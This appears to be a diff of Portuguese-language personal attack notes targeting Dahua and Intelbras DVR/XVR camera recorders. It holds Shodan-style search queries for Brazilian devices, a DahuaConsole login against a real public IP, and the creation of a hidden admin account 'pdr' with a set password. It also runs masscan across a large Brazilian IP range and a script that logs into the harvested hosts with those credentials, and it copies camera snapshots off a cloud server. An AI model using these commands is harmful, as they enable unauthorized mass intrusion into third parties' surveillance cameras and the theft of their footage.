@@ -4,6 +4,16 @@ e roda, pra ver se conecta no console
 
 Dahua product:"Dahua XVR" version:"3.218.0000001.4"
 
+MHDX 5116 product:"Dahua MHDX 5116"
+
+mhdx country:"BR" product:"Intelbras MHDX 5116"
+
+MHDX 3008 country:"BR"
+
+mhdx country:"BR" product:"Intelbras MHDX 1116" city:"São Paulo"
+
+MHDX 1016
+
 python3 Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204
 
 usermgr add pdr Senha@2026 admin
@@ -41,6 +51,11 @@ python3 dh.py -i 127.0.0.1 -p 8080
 .
 .
 .
+
+Comando blade:
+
+python3 blade.py --tunnel -s seriais.txt
+
 .
 .
 .
@@ -55,4 +70,10 @@ grep -E 'tcp (37776|37777|37778)' /home/ubuntu/DahuaConsole/ipsformatados.txt | 
 
 scp -r -i "C:\Users\LENOVO\Desktop\Ubuntu\chave-projeto.pem" ubuntu@3.82.175.239:/home/ubuntu/DahuaConsole/snapshots_20260603_151938 C:\Users\LENOVO\Desktop\
 
+em último caso:
 
+python3 dhv2.py -f ips_8080.txt -p 8080 -u pdr -P Senha@2026 -t 250
+
+sudo masscan -p 8080 177.30.0.0-177.40.255.255 --rate 5000 -oL /home/ubuntu/DahuaConsole/ipsformatados.txt -e ens5
+
+grep 'open tcp 8080' /home/ubuntu/DahuaConsole/ipsformatados.txt | awk '{print $4}' > /home/ubuntu/DahuaConsole/ips_8080.txt
